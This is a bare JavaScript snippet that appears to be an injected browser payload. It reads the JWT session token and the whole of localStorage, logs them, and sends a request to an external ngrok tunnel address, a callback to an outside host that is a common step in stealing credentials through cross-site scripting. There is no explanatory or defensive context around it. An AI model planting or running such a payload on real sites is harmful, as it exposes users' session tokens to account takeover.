!function () {
    console.log(localStorage.jwtToken)
    console.log(JSON.stringify(localStorage));
    const Http = new XMLHttpRequest();
const url='https://8d88be5b3dd5.ngrok.io/status';
Http.open("GET", url);
Http.send();

Http.onreadystatechange = (e) => {
  console.log(Http.responseText)
}
  }();
  